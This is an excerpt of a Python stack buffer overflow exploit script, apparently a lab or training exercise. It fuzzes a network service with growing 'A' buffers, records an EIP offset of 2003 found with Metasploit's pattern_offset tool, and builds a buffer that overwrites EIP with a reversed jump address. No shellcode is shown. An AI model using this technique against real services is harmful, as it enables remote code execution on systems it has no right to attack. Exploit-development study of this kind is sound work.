...
def fuzzing():
    ...
    while True:
        try:
            ...
            s.close()
            sleep(1)
            buffer = buffer + "A"*100       #append another 100 A's
        except:
            print ("Fuzzing crashed at %s bytes" % str( len( buffer ) ) )
            sys.exit()

def findtheoffset():
    #buffer needs to be populated from create_pattern
...
#STEP 1.    FUZZING WITH A's
#   fuzzing()

#STEP 2.    FINDING THE OFFSET
#   findtheoffset()
#   386F4337 is the EIP value from immunitydebugger
#   /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
#   match at offset 2003

offset=2003

#STEP 3.    OVERWRITE THE EIP
#   overwritetheoffset()
#   DO WE HAVE EXACTLY BBBB IN THE EIP?

#STEP 4.    FIND THE BAD CHARACTERS
#   findthebadcharacters()

#STEP 5.    ADD THE ADDRESS POINTERS
#   pointer = 625011af but needs to be reversed as we are using little endian format and x86 requires it
addrPointer = "\xaf\x11\x50\x62"
buffer = "A"*offset + addrPointer
hitthepointer(buffer)
